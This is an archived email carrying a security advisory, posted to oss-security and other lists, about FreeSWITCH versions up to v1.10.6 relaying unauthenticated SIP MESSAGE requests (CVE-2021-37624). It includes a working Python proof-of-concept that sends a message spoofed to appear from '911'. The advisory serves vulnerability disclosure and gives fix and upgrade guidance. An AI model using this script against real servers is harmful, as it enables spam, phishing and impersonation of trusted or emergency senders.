X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4152" "Monday" "25" "October" "2021" "16:24:18" "+0200" "Sandro Gauci" "sandro@enablesecurity.com" nil "76" "[oss-security] [ES2021-07] FreeSWITCH does not authenticate SIP MESSAGE requests, leading to spam and message spoofing" nil nil nil "10" nil nil (number mark "U       sandro@enabl Oct 25   76/4152  " thread-indent "\"[oss-security] [ES2021-07] FreeSWITCH does not authenticate SIP MESSAGE requests, leading to spam and message spoofing\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [ES2021-07] FreeSWITCH does not authenticate SIP MESSAGE requests, leading to spam and message spoofing" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5656 invoked by uid 550); 25 Oct 2021 14:38:08 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29981 invoked from network); 25 Oct 2021 14:24:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=mime-version:message-id:date:from:to
	:subject:content-type; s=fm1; bh=J4Uuusyo61keUjpa8pM1GBZeZZFv74R
	aU5m1yILQEZ4=; b=bT78R+n30Cf1X6J+wUW7J4AeJJTaUTMuCSJsbwtRAdm3XzL
	uU7xGzvM6/zMrvoAQGFY4lOfVdSGpmcUf025SPJ7B0403U33mXxb8tzl8b/lhR1H
	IlChb6kvSreO/EKTz671HnsEG3fWNv/vtWpE/S8S6I7OqL3jwzSHOjJ8un5ac+c/
	LXrIyvQ3lfSDYUdrBT2MX6RmQzOJY/vVthR53P6RGhBcBTQM534ZmayeGJ1LM6B0
	xcm7MWJ2DtC2tgInfm6fVupIaMcrpfzKl3RZrmjJ/7vsol7ojPC1AwUlTx2ocZ4o
	z5zyosFcqIIKXdBU7G6ame6gjDIVHfnHgaEEoZA==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=content-type:date:from:message-id
	:mime-version:subject:to:x-me-proxy:x-me-proxy:x-me-sender
	:x-me-sender:x-sasl-enc; s=fm1; bh=J4Uuusyo61keUjpa8pM1GBZeZZFv7
	4RaU5m1yILQEZ4=; b=dQLw69qYxqgLcdP/1TvyNjMqHSTMtOeTsWVwUzJPRLVui
	EQPFXbmseEnWZGViPoJ5zAKqbClL0X31JU036e6yasCuvxdVg8FXp+LKlvRLJqVq
	o/XWU+vDCe6uZun20RnPIjQ/Xgc1qH3XTHCJti7SZ4qseRHVVCgnrjowyYxu7WeE
	Zsf9TeA2BYtn44tt92whzfF2YYfs18XvKRdZVS0dvnqiF8ezHLsrleo2IpuXZ5XV
	bb2pycil0+ztd8VSFQPX0UKk2XcImcqzfIjZVHnYdwG62etT2MppQyeDufwWN6bD
	4vKld/cs/qZDmMnzbum2Bgal+LLKIhmBX6I9J7jFQ==
X-ME-Sender: <xms:J752YRpGC5d1-0K5Sh_afs1TKBonoFgmdjsQuzV4NTFOs_lG21lh-A>
    <xme:J752YTpRtuT6t5MljxGU7r8oekPt7m5iNgBN3ztuGPHbctCe2o7Vch4OVIHuUvddZ
    WZSk_rER5m61NlCuw>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvtddrvdefhedgjeefucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucenucfjughrpefofgggkfffhffvufgtsehttdertd
    erredtnecuhfhrohhmpedfufgrnhgurhhoucfirghutghifdcuoehsrghnughrohesvghn
    rggslhgvshgvtghurhhithihrdgtohhmqeenucggtffrrghtthgvrhhnpeeuudefgeefue
    etvdejueeuuedtuedtkeetvdejfeduffegueffleehffeviefhteenucffohhmrghinhep
    ghhithhhuhgsrdgtohhmpdgvnhgrsghlvghsvggtuhhrihhthidrtghomhenucevlhhush
    htvghrufhiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhrohhmpehsrghnughrohesvghn
    rggslhgvshgvtghurhhithihrdgtohhm
X-ME-Proxy: <xmx:J752YeMJc1PVtyAue76y0UxC5Nw-reqbByksg90iIhv_KBXSz7zCNg>
    <xmx:J752Yc6TBB-VPgjcJqdXgGydoGuNGeWdDNxeW-OM6bUeSccN1XA9eA>
    <xmx:J752YQ7H6XNqYNpk7M_SmSBqY7HGLJH7BuLPdvdf5qCnHKp_LHWZ9Q>
    <xmx:J752Yb3DtxonYU9VvU80BZBH6uZ5_1SaYYfB3Sfn9JocK_jXaxwlWA>
X-Mailer: MessagingEngine.com Webmail Interface
User-Agent: Cyrus-JMAP/3.5.0-alpha0-1369-gd055fb5e7c-fm-20211018.002-gd055fb5e
Mime-Version: 1.0
Message-Id: <fb9b3895-de3a-4631-9abb-9cf917f6fa33@www.fastmail.com>
Date: Mon, 25 Oct 2021 16:24:18 +0200
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: oss-security@lists.openwall.com, bugtraq@securityfocus.com,
 fulldisclosure@seclists.org, voipsec@voipsa.org,
 submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
Content-Type: text/plain
Subject: [oss-security] [ES2021-07] FreeSWITCH does not authenticate SIP MESSAGE requests, leading to
 spam and message spoofing

# FreeSWITCH does not authenticate SIP MESSAGE requests, leading to spam and message spoofing

- Fixed versions: v1.10.7
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-07-freeswitch-SIP-MESSAGE-without-auth
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-mjcm-q9h8-9xv3
- Other references: CVE-2021-37624
- Tested vulnerable versions: <= v1.10.6
- Timeline:
    - Report date: 2021-06-07
	- Fix provided for testing: 2021-07-27
	- Vendor release with fix: 2021-10-24
	- Enable Security advisory: 2021-10-25

## Description

By default, SIP requests of the type MESSAGE (RFC 3428) are not authenticated in the affected versions of FreeSWITCH. MESSAGE requests are relayed to SIP user agents registered with the FreeSWITCH server without requiring any authentication. Although this behaviour can be changed by setting the `auth-messages` parameter to `true`, it is not the default setting.

## Impact

Abuse of this security issue allows attackers to send SIP MESSAGE messages to any SIP user agent that is registered with the server without requiring authentication. Additionally, since no authentication is required, chat messages can be spoofed to appear to come from trusted entities. Therefore, abuse can lead to spam and enable social engineering, phishing and similar attacks.

We are issuing this advisory because, in the course of our work, we have noticed that most FreeSWITCH installations that are exposed to the Internet do not authenticate MESSAGE requests.

## How to reproduce the issue

1. Install FreeSWITCH v1.10.6 or lower
2. Run FreeSWITCH using the default configuration
3. Register as a legitimate SIP user with the FreeSWITCH server (e.g. `sip:1000@192.168.1.100` where `192.168.1.100` is your FreeSWITCH server) using a softphone that can process MESSAGE (such as Zoiper)
4. Save the below Python script to `anon-message.py`
5. Run the Python script `python anon-message.py <freeswitch_ip> <target_extension>`
6. Observe the SIP message appear on your softphone, pretending to be from 911


```python
import sys, socket, random, string

UDP_IP = sys.argv[1]
UDP_PORT = 5060
ext = sys.argv[2]
rand = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
msg="MESSAGE sip:%s@%s SIP/2.0\r\n" % (ext, UDP_IP)
msg+="Via: SIP/2.0/UDP 192.168.1.159:46896;rport;branch=z9hG4bK-%s\r\n" % rand
msg+="Max-Forwards: 70\r\n"
msg+="From: 911 <sip:911@%s>;tag=%s\r\n" %(UDP_IP, rand)
msg+="To: <sip:%s@%s>\r\n" %(ext, UDP_IP)
msg+="Call-ID: %s\r\n" % rand
msg+="CSeq: 1 MESSAGE\r\n"
msg+="Contact: <sip:911@192.168.1.159:48760;transport=udp>\r\n"
msg+="Content-Type: text/plain\r\n"
msg+="Content-Length: 5\r\n\r\n"
msg+="hello"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
```

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

> Our recommendation is that this SIP message type is authenticated by default so that FreeSWITCH administrators do not need to be explicitly set the `auth-messages` parameter. When following such a recommendation, a new parameter can be introduced to explicitly disable authentication.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

